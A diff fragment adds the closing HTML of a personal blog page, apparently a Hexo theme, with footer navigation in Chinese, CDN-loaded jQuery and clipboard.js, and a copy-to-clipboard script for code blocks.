+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
